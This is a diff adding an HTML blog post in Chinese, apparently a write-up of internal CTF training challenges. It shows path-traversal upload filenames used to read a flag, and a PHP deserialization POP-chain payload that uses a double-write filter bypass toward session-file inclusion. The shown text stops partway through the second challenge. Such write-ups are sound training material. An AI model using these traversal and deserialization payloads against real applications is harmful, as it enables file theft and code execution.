@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言年底了，巨忙。。。只能周末抽空看看练习题。以下是部分解题思路及复现思路。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内部靶场训练1208-1214">
+<meta property="og:url" content="http://example.com/2025/12/13/%E5%86%85%E9%83%A8%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%831208-1214/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="前言年底了，巨忙。。。只能周末抽空看看练习题。以下是部分解题思路及复现思路。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://free.wmhua.cn/2025/12/13/693d62b08b4a7.png">
+<meta property="og:image" content="https://free.wmhua.cn/2025/12/13/693d63df13106.png">
+<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d689126a96.png">
+<meta property="og:image" content="https://free.wmhua.cn/2025/12/13/693d691623908.png">
+<meta property="og:image" content="https://free.wmhua.cn/2025/12/13/693d679a68d7d.png">
+<meta property="og:image" content="https://free.wmhua.cn/2025/12/13/693d6ca072e50.png">
+<meta property="og:image" content="https://free.wmhua.cn/2025/12/13/693d6d05e7850.png">
+<meta property="og:image" content="https://free.wmhua.cn/2025/12/13/693d6dd23074c.png">
+<meta property="og:image" content="https://free.wmhua.cn/2025/12/14/693e2f37745a1.png">
+<meta property="article:published_time" content="2025-12-13T12:43:41.000Z">
+<meta property="article:modified_time" content="2025-12-14T03:42:47.428Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="内部靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://free.wmhua.cn/2025/12/13/693d62b08b4a7.png">
+
+
+<link rel="canonical" href="http://example.com/2025/12/13/%E5%86%85%E9%83%A8%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%831208-1214/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/12/13/%E5%86%85%E9%83%A8%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%831208-1214/","path":"2025/12/13/内部靶场训练1208-1214/","title":"内部靶场训练1208-1214"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>内部靶场训练1208-1214 | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#gob"><span class="nav-number">2.</span> <span class="nav-text">gob</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#eem%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">3.</span> <span class="nav-text">eem代码审计</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#interesting-web"><span class="nav-number">4.</span> <span class="nav-text">interesting web</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#image-up"><span class="nav-number">5.</span> <span class="nav-text">image_up</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">95</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/13/%E5%86%85%E9%83%A8%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%831208-1214/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="内部靶场训练1208-1214 | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内部靶场训练1208-1214
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-13 20:43:41" itemprop="dateCreated datePublished" datetime="2025-12-13T20:43:41+08:00">2025-12-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-12-14 11:42:47" itemprop="dateModified" datetime="2025-12-14T11:42:47+08:00">2025-12-14</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>年底了，巨忙。。。只能周末抽空看看练习题。以下是部分解题思路及复现思路。</p>
+<span id="more"></span>
+
+<h1 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h1><p>这个题目其实不算难，但是做了挺久的。。。</p>
+<p>一开始是给了一个登录框，这里随便输入就可以登上去。再然后就是一个upload的接口，以及一个show的接口。upload这里尝试传文件上去，发现没有文件类型限制，任何文件都可以传上去，于是一开始直接传了一个shell过去，访问发现根本解析不了。然后传了个<code>.htaccess</code>，把png文件解析成php文件，发现还是不行。</p>
+<p>然后就转到思路二，既然这个目录下解析不了，有没有可能往上穿越？upload那里抓包修改<code>filename</code>，改成<code>filename=&quot;../shell.php&quot;</code>。然后访问可以发现文件确实上传到上一个目录了。访问还是解析不了，于是接着穿越，发现最多只能传到<code>/upload</code>下，依然解析不了。</p>
+<p>思路三，既然给了一个上传的接口，并且任何形式的文件都可以上传，还给了一个show的接口，可以看到是把文件内容的base64编码展示出来。那么show是有一个读文件的操作，于是怀疑phar反序列化。但是这个需要源码啊，扫了半天没扫到。。。这个也放弃了</p>
+<p>思路四，又仔细想了一下，为什么每次show的时候，都是最近上传的一个图片的内容，然后又观察了一下cookie，很像base64编码，于是尝试解码发现字符串很像序列化的格式：</p>
+<p><img src="https://free.wmhua.cn/2025/12/13/693d62b08b4a7.png" alt="gob1.png"></p>
+<p>这个看上去不像是<code>php</code>的序列化格式，拿给<code>deepseek</code>去分析下，发现是go的。</p>
+<p>所以思路重新梳理一下，我在upload那里上传一个普通图片，然后抓包放包，然后再show那里再抓包，把cookie解码一下发现：</p>
+<p><img src="https://free.wmhua.cn/2025/12/13/693d63df13106.png" alt="gob2.png"></p>
+<p><code>Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAAD/gP+CAQVhZG1pbgEGMTExMTExAUouL3VwbG9hZHMvYjdhZmQ5OGRiN2VmMjQzODE0OWEyNTJiN2EyOGFiNGUvLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZmxhZwEgZTYwZTlhOWNlY2M3ZjVlMjY5MTEzZjg2NzljZTMxZDYA</code>对于解码的内容为：</p>
+<p><img src="https://cdn4.winhlb.com/2025/12/13/693d689126a96.png" alt="gob5.png"></p>
+<p>可以猜测一下其实读取的<code>filename</code>值来源于<code>cookie</code>，但是这里的cookie不能直接伪造，试了几个go的序列化脚本发现都不对。那就沿用呗。</p>
+<p>直接在upload那里重新上传抓包，修改<code>filename=&quot;../../../../../../flag&quot;</code>，上传显示文件以及存在，然后再去show的时候，可以发现直接把flag的值读出来了。。</p>
+<p><img src="https://free.wmhua.cn/2025/12/13/693d691623908.png" alt="gob6.png"></p>
+<h1 id="eem代码审计"><a href="#eem代码审计" class="headerlink" title="eem代码审计"></a>eem代码审计</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eem</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hh</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ff</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gg</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hh = <span class="keyword">new</span> phpinfo;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hh))  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hh-&gt;<span class="title function_ invoke__">exec</span>();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nb</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">unserialize</span>($<span class="title">this</span>-&gt;<span class="title">test</span>);</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">class</span>-&gt;<span class="title">ff</span> = $<span class="title">sth</span>;</span></span><br><span class="line"><span class="class">        <span class="title">if</span>($<span class="title">this</span>-&gt;<span class="title">class</span>-&gt;<span class="title">ff</span> === $<span class="title">this</span>-&gt;<span class="title">class</span>-&gt;<span class="title">gg</span>)</span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;<span class="subst">$this</span>-&gt;filename&quot;</span>;        </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">include_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">include_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpinfo</span></span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">phpinfo</span>();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;php&#x27;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;./index.php&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有<code>unserialize</code>函数，也有<code>session[&#39;user&#39;]=$user</code>，然后还有<code> return include_once($_GET[&#39;data&#39;])</code>，很明显是反序列化+session文件包含。</p>
+<p>那么需要搞清楚</p>
+<p>1.pop链怎么写</p>
+<p>2.session文件在哪里？这里可以尝试默认的目录。一般我们是从phpinfo里面获取，然而 这里也给了<code> return phpinfo();</code>。</p>
+<p>所以没有什么弯弯绕绕，思路很清晰，先是想办法读phpinfo，拿到session文件路径，然后根据cookie，往session文件里面写shell，最后构造pop链触发包含即可。</p>
+<p>一开始咋一看还没看出来怎么构造pop链，因为<code>unserialize</code>之后，没有<code>destruct、wake_up</code>这类魔法函数，不过巧合在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = unserialize($data);</span><br><span class="line">echo $data; </span><br></pre></td></tr></table></figure>
+
+<p>这两个组合再一起，就可以触发<code>__toString</code> 这个魔法函数了。</p>
+<p>所以思路很简答，先构造链子读phpinfo:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eem</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hh</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ff</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gg</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hh = <span class="keyword">new</span> phpinfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpinfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">eem</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行得到：O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>eem%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>hh%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>phpinfo%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>ff%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>gg%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>不过这里要注意：<code> $data = str_replace(array(&#39;file&#39;,&#39;php&#39;), &#39;&#39;, $_GET[&#39;data&#39;]);</code>会替换成空，所以我们直接双写绕过。</p>
+<p>poc1:<code>O%3A3%3A%22eem%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00hh%22%3BO%3A7%3A%22pphphpinfo%22%3A0%3A%7B%7Ds%3A2%3A%22ff%22%3BN%3Bs%3A2%3A%22gg%22%3BN%3B%7D</code></p>
+<p><img src="https://free.wmhua.cn/2025/12/13/693d679a68d7d.png" alt="gob4.png"></p>
+<p>这里可以发现就是默认路径 <code>/var/lib/php/sessions</code>，所以这里路径确认了，接下来是怎么调用到 <code>return include_once($_GET[data]);</code> </p>
+<p>一开始有点迷惑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nb</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">unserialize</span>($<span class="title">this</span>-&gt;<span class="title">test</span>);</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">class</span>-&gt;<span class="title">ff</span> = $<span class="title">sth</span>;</span></span><br><span class="line"><span class="class">        <span class="title">if</span>($<span class="title">this</span>-&gt;<span class="title">class</span>-&gt;<span class="title">ff</span> === $<span class="title">this</span>-&gt;<span class="title">class</span>-&gt;<span class="title">gg</span>)</span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;<span class="subst">$this</span>-&gt;filename&quot;</span>;        </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">include_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">include_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我要能调用<code>return include_once($_GET[&#39;data&#39;]);</code>，必须得<code>$this-&gt;class-&gt;ff === $this-&gt;class-&gt;gg</code>，然后这里前面还有一个<code>$this-&gt;class = unserialize($this-&gt;test)</code>，所以我在想<code>nb</code>类的<code>test</code>属性是不是得指向一个序列化字符串的类。那指向哪个类呢？另外还有一个<code>$this-&gt;class-ff=$sth</code>。</p>
+<p>这里的<code>$sth</code>是不存在的，后面尝试了一下发现这些都是干扰项，我们可以本地测试一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">unserialize</span>($<span class="title">this</span>-&gt;<span class="title">test</span>);</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">class</span>-&gt;<span class="title">ff</span> = $<span class="title">sth</span>;</span></span><br><span class="line"><span class="class">        <span class="title">if</span>($<span class="title">this</span>-&gt;<span class="title">class</span>-&gt;<span class="title">ff</span> === $<span class="title">this</span>-&gt;<span class="title">class</span>-&gt;<span class="title">gg</span>)</span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">include_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;successfully!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">nb</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">exec</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出结果：</span></span><br><span class="line">D:\phpstudy_pro\Extensions\php\php5.<span class="number">4.45</span>nts\php.exe D:\phpstudy_pro\WWW\poc.php</span><br><span class="line">Warning: Creating <span class="keyword">default</span> <span class="keyword">object</span> <span class="keyword">from</span> <span 